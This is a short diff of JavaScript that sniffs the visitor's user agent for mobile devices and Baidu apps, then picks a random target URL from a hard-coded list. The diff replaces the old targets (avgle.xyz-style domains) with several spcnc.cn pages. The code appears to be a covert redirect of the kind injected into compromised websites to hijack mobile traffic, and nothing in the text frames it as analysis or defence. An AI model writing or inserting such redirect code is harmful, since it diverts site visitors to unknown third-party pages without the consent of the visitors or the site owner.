@@ -11,9 +11,9 @@ var isBDAPP=sUserAgent.match(/baiduboxapp/i) == "baiduboxapp";
 var isBDBrowser=sUserAgent.match(/baidubrowser/i) == "baidubrowser";
 var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP || isBDAPP
 if(isM) {
-	var str=new Array("http://avgoogle.xyz","http://avgle.xyz");
+	var str=new Array("http://app.spcnc.cn/home.html","http://app2.spcnc.cn/home.html");
 }else{
-		var str=new Array("http://www.avgle.xyz","http://www.avgoogle.xyz");
+		var str=new Array("http://app4.spcnc.cn/home.html","http://app3.spcnc.cn/home.html");
 }
 var aric_a;
 aric_a = str[parseInt(Math.random()*(str.length))];
